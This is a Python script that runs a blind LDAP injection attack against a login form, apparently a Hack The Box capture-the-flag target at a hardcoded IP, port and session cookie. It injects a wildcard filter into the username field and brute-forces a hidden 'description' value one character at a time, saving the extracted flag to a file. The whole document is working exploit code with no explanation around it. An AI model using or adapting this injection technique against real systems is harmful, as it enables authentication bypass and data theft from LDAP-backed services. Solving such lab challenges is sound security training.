import requests
import string
import time

url = "http://94.237.50.5:33092/index.php"

# Create character set: lowercase, uppercase, numbers, and special characters
chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-{}!@#$%^&*()+"

# Success message
SUCCESS_MSG = "Login successful but the site is temporarily down for security reasons. Please try again later!"

found_flag = ""
char_found = True

headers = {
    'Host': '94.237.50.5:33092',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'http://94.237.50.5:33092/index.php',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://94.237.50.5:33092',
    'DNT': '1',
    'Connection': 'close',
    'Cookie': 'PHPSESSID=mnkn76eh8uugj3sos6q4dr02ju',
    'Upgrade-Insecure-Requests': '1',
    'Sec-GPC': '1'
}

def try_char(current_flag, char):
    """Try a single character at the current position"""
    payload = f"username=admin*)%28|%28description=htb{{{current_flag}{char}*&password=invaild%29"
    try:
        response = requests.post(url, data=payload, headers=headers, allow_redirects=False)
        if SUCCESS_MSG in response.text:
            print(f"\nFound character: {char}")
            return True
        return False
    except Exception as e:
        print(f"\nError occurred: {e}")
        time.sleep(1)  # Wait longer on error
        return False

def print_progress(current_char, total_chars, found_flag):
    """Print current progress"""
    print(f"\rTrying character {current_char}/{total_chars} | Current flag: htb{{{found_flag}}}", end="", flush=True)

print("Starting LDAP injection attack...")
print("Character set:", chars)
print("Brute forcing flag character by character...\n")

try:
    while char_found:
        char_found = False
        total_chars = len(chars)
        
        for i, c in enumerate(chars, 1):
            print_progress(i, total_chars, found_flag)
            
            if try_char(found_flag, c):
                found_flag += c
                char_found = True
                print(f"\nCurrent flag: htb{{{found_flag}}}")
                print("-" * 50)
                break
                
            time.sleep(0.1)  # Delay between attempts
        
        # If no character found, try closing brace
        if not char_found and try_char(found_flag, "}"):
            found_flag += "}"
            print(f"\nFound closing brace! Flag complete!")
            break

except KeyboardInterrupt:
    print("\n\nAttack interrupted by user!")
    
except Exception as e:
    print(f"\n\nAn error occurred: {e}")

finally:
    print("\nAttack completed!")
    print(f"Final flag: htb{{{found_flag}}}")
    
    # Save flag to file
    with open('found_flag.txt', 'w') as f:
        f.write(f"htb{{{found_flag}}}")
    print("Flag saved to found_flag.txt")